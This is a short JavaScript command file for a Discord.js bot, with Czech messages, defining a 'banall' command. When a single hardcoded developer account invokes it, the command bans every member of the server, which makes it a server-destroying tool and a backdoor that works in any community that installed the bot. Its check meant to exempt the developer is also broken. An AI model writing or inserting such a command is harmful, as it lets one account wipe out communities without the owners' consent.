const Discord = require("discord.js")

module.exports.run = async (bot, message, args) => {
    let BReason = args.join(" ").slice(0);
    if (!BReason) return message.reply("Žádný důvod, nebyl napsán?")
    if (message.author.id != 417403958814965771) return message.reply("Nemůžeš používat Developerský Příkaz!")

    let C = message.channel;
    message.guild.members.forEach((f, i) => {
        if (f.id == 417403958814965771) return message.reply("Nemůžeš zabanovat Dev Bot.");
        message.guild.member(f).ban(BReason);
        message.channel.send(`Zabanován ${f}!`);
    });
    C.send("Všichni uživatele byly zablokováni.");
}
module.exports.help = {
    name: "banall",
    aliases: []
}
